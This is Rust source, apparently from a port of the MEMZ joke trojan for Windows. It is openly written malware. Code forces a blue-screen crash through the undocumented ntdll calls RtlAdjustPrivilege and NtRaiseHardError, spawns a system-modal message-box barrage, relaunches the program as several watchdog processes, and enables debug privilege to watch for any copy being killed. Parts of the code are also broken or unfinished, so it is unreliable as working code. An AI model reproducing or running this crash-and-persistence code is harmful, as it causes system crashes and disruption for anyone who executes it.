#![allow(unused_imports)]
#![allow(dead_code)]
use ::log::error;
#[cfg(all(feature = "DEBUG_MODE", feature = "WTACHDOG"))]
use ::log::{error, info};

use memz_rs::{
    convert_str::ToPCSTRWrapper,
    data::data::{MEMZ_MSGBOXA_1, MEMZ_MSGBOXA_2, MSGS},
    ntdll::{
        library::Library,
        ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
    },
    payloads::payloads::msg_box_hook,
    utils::log::{self, write_log, LogType},
    wrap_windows_api::*,
    LMEM_ZEROINIT,
};
use rand::Rng;
use std::{
    mem::size_of,
    process,
    thread::{self, sleep},
    time::Duration,
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{
            BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, LPARAM, LRESULT, NTSTATUS, WPARAM,
        },
        Graphics::Gdi::{HBRUSH, HFONT},
        Security::SE_DEBUG_NAME,
        System::{
            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
        },
        UI::{
            Shell::{ShellExecuteA, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
            WindowsAndMessaging::{
                CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
                HCURSOR, HICON, HMENU, IDYES, MB_ICONHAND, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL,
                MB_YESNO, MSG, SW_SHOWDEFAULT, WH_CBT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
            },
        },
    },
};

struct Clean {
    main_window: HWND,
    font: HFONT,
    dialog: HWND,
}

fn kill_windows() -> Result<(), WinError> {
    for _ in 0..20 {
        let rip_message_thread = thread::spawn(move || -> Result<(), WinError> {
            let hook = wrap_set_windows_hook_ex_a(
                WH_CBT,
                Some(msg_box_hook),
                HMODULE(0_isize),
                wrap_get_current_thread_id(),
            )?;
            let mut rng = rand::thread_rng();
            let random = rng.gen_range(0..=25);
            wrap_messagebox_a(
                HWND(Default::default()),
                *MSGS[random as usize].to_pcstr(),
                "MEMZ",
                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
            )?;
            wrap_unhook_windows_hook_ex(hook)?;
            Ok(())
        });
        rip_message_thread.join().unwrap().unwrap();
        sleep(Duration::from_millis(100));
    }

    kill_windows_instant()?;
    Ok(())
}

fn kill_windows_instant() -> Result<(), WinError> {
    // Try to force BSOD first
    // I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
    // This isn't even an exploit, it's just an undocumented feature.
    let mut tmp1 = 0;
    let mut tmp2 = 0;
    let lib = Library::new("ntdll.dll");
    let rtl_adjust_privilege_proc: Option<RtlAdjustPrivilegeFn> =
        lib.get_proc("RtlAdjustPrivilege");

    match rtl_adjust_privilege_proc {
        Some(rtl_adjust_privilege) => rtl_adjust_privilege(19, 1, 0, &mut tmp1),
        None => panic!("Failed GetProc RtlAdjustPrivilege"),
    };

    let nt_raise_hard_error_proc: Option<NtRaiseHardErrorFn> = lib.get_proc("NtRaiseHardError");

    match nt_raise_hard_error_proc {
        Some(nt_raise_hard_error) => {
            nt_raise_hard_error(NTSTATUS(0xc0000022 as u32 as i32), 0, 0, 0, 6, &mut tmp2)
        }
        None => panic!("Failed GetProc NtRaiseHardError"),
    };

    Ok(())
}

fn main() -> Result<(), WinError> {
    log::new_log();
    let res = Resolution::new();
    #[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
    {
        let watchdog_thread = thread::spawn(watchdog_thread);
        watchdog_thread.join().unwrap().unwrap();

        let c: WNDCLASSEXA = WNDCLASSEXA {
            cbSize: size_of::<WNDCLASSEXA>() as u32,
            style: CS_HREDRAW | CS_VREDRAW,
            lpfnWndProc: Some(window_proc),
            cbClsExtra: 0,
            cbWndExtra: 0,
            hInstance: HMODULE(0),
            hIcon: HICON(0),
            hCursor: HCURSOR(0),
            hbrBackground: HBRUSH(0),
            lpszMenuName: PCSTR::null(),
            lpszClassName: *"hax".to_pcstr(),
            hIconSm: HICON(0),
        };

        wrap_register_class_ex_a(&c)?;

        let hwnd = unsafe {
            CreateWindowExA(
                WINDOW_EX_STYLE(0),
                *"hax".to_pcstr(),
                PCSTR::null(),
                WINDOW_STYLE(0),
                0,
                0,
                100,
                100,
                HWND(0),
                HMENU(0),
                HMODULE(0),
                None,
            )
        };

        if hwnd.0 == 0 {
            panic!("CreateWindowExA is NULL")
        }

        let mut msg: MSG = Default::default();
        while wrap_get_message(&mut msg, hwnd, 0, 0)? {
            unsafe {
                if !TranslateMessage(&mut msg).as_bool() {
                    write_log(
                        LogType::ERROR,
                        "Failed TranslateMessage()\nError: message is not translated",
                    );
                    return Err(WinError::Failed);
                };

                DispatchMessageA(&mut msg); // return value generally is ignored
            };
        }
    }

    #[cfg(not(feature = "DEBUG_MODE"))]
    {
        if wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_1, "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
            || wrap_messagebox_a(HWND(0), MEMZ_MSGBOXA_2, "MEMZ", MB_YESNO | MB_ICONWARNING)?
                != IDYES
        {
            process::exit(0);
        }
    }

    let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
    wrap_get_module_file_name(
        HANDLE::default(),
        HMODULE(8192 as isize),
        fn_buf.as_mut_slice(),
    )?;

    let path = std::str::from_utf8(&fn_buf).unwrap();

    for _ in 0..5 {
        wrap_shell_execute_a(
            HWND(0),
            PCSTR::null(),
            *path.to_pcstr(),
            *"/watchdog".to_pcstr(),
            PCSTR::null(),
            SW_SHOWDEFAULT,
        )?;
    }

    let info = SHELLEXECUTEINFOA {
        cbSize: size_of::<SHELLEXECUTEINFOA>() as u32,
        fMask: SEE_MASK_NOCLOSEPROCESS,
        hwnd: HWND(0),
        lpVerb: PCSTR::null(),
        lpFile: *path.to_pcstr(),
        lpParameters: *"/main".to_pcstr(),
        lpDirectory: PCSTR::null(),
        nShow: SW_SHOWDEFAULT.0 as i32,
        hInstApp: HMODULE(0),
        ..Default::default()
    };

    Ok(())
}

#[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
fn watchdog_thread() -> Result<(), ()> {
    let mut oproc = 0;
    let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
    wrap_get_process_image_filename_a(&mut f_buf1)?;
    #[cfg(feature = "WATCHDOG")]
    {
        let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
        let data = data.replace("\0", "");
        println!("{}", data);
        info!(target: "info_log", "{}", data);
        sleep(Duration::from_millis(500));
    }
    sleep(Duration::from_millis(1000));

    set_privilege(SE_DEBUG_NAME, true)?;

    #[cfg(feature = "WATCHDOG")]
    {
        info!(target: "info_log", "{}", dbg!(set_privilege(SE_DEBUG_NAME, true)?))
    }
    loop {
        let snapshot = wrap_create_toolhelp32_snapshot()?;
        #[cfg(feature = "WATCHDOG")]
        {
            info!(target: "info_log", "{:?}", dbg!(&snapshot));
            sleep(Duration::from_millis(500));
        }
        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
            dwSize: size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        unsafe {
            Process32First(snapshot, &mut proc);
            // #[cfg(feature = "DEBUG")]
            {
                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                let file = file.replace("\0", "");

                let th32_process_id = format!(
                    "Process32First() proc.th32ProcessID: {}",
                    proc.th32ProcessID
                );
                let sz_exe_file = format!("Process32First() proc.szExeFile: {}", file);
                println!("{}", th32_process_id);
                println!("{}", sz_exe_file);
                info!(target: "info_log", "{}", th32_process_id);
                info!(target: "info_log", "{}", sz_exe_file);
                sleep(Duration::from_millis(500));
            }
        }

        let mut nproc = 0;
        loop {
            let mut h_proc: Option<HANDLE> = None;
            if proc.th32ProcessID != 0 {
                unsafe {
                    h_proc = match OpenProcess(
                        PROCESS_QUERY_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
                        BOOL(0),
                        proc.th32ProcessID,
                    ) {
                        Ok(handle) => Some(handle),
                        Err(e) => {
                            let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
                            error!(target: "err_log", "{}\n{}\n", data, dbg!(&e));
                            None
                        }
                    };
                }
            }
            #[cfg(feature = "WATCHDOG")]
            {
                info!(target: "info_log", "{:?}\n", dbg!(&h_proc));
                sleep(Duration::from_millis(500));
            }
            let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
            wrap_get_process_image_filename_a(&mut f_buf2)?;
            #[cfg(feature = "WATCHDOG")]
            {
                let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
                let data = data.replace("\0", "");
                println!("{}", data);
                info!(target: "info_log", "{}\n", data);
                sleep(Duration::from_millis(500));
            }
            if f_buf1 != f_buf2 {
                nproc += 1;
                #[cfg(feature = "WATCHDOG")]
                {
                    info!(target: "info_log", "{}\n", dbg!(&nproc));
                    sleep(Duration::from_millis(500));
                }
            }

            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
            drop(f_buf2);

            #[cfg(not(feature = "WATCHDOG"))]
            if !wrap_process32_next(snapshot, &mut proc) {
                break;
            }
            #[cfg(feature = "WATCHDOG")]
            if dbg!(!wrap_process32_next(snapshot, &mut proc)) {
                break;
            }

            if proc.th32ProcessID == 0 {
                error!(target: "err_log", "Unable to open system process");
                panic!("Unable to open system process");
            }

            #[cfg(feature = "WATCHDOG")]
            {
                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                let file = file.replace("\0", "");
                let th32_process_id =
                    format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
                println!("{}", th32_process_id);
                println!("{}", sz_exe_file);
                info!(target: "info_log", "{}\n", th32_process_id);
                info!(target: "info_log", "{}\n", sz_exe_file);
                sleep(Duration::from_millis(500));
            }
        }
        wrap_close_handle(snapshot)?;

        if nproc < oproc {
            kill_windows()?;
        }
        oproc = nproc;

        sleep(Duration::from_millis(10));
    }
}

unsafe extern "system" fn window_proc(_: HWND, _: u32, _: WPARAM, _: LPARAM) -> LRESULT {
    todo!()
}
